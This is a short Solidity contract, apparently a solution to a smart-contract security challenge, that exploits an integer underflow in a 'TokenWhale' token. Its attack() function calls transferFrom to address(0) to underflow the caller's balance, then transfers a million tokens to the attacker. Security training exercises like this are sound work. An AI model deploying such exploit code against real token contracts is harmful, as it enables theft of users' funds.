// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;

interface TokenWhale {
    function transfer(address to, uint256 value) external;

    function approve(address spender, uint256 value) external;

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external;

    function balanceOf(address owner) external returns (uint256);
}

contract AttackTokenWhale {
    address target;

    constructor(address _target) {
        target = _target;
    }

    function attack() external {
        TokenWhale(target).transferFrom(msg.sender, address(0), 1); // get us a huge balance due to underflow
        TokenWhale(target).transfer(msg.sender, 1000000); // give a bit to attacker so its balance > 1MM
    }

    receive() external payable {}
}
